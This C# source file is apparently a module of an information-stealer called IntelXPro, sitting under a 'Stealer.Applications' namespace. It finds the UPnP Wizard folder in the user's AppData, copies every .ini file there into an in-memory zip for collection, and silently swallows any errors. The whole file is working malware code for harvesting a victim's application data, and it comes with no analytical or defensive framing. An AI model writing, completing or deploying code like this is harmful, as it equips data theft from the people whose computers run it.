using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class UPnPWizard : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "UPnP Wizard");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "UPnPWizard";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] iniFiles = Directory.GetFiles(basePath, "*.ini", SearchOption.TopDirectoryOnly);
                
                foreach (string file in iniFiles)
                {
                    string fileName = Path.GetFileName(file);
                    string zipPath = $"Applications\\UPnPWizard\\{location}\\{fileName}";
                    zip.AddFile(zipPath, File.ReadAllBytes(file));
                    counterApplications.Files.Add(file + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
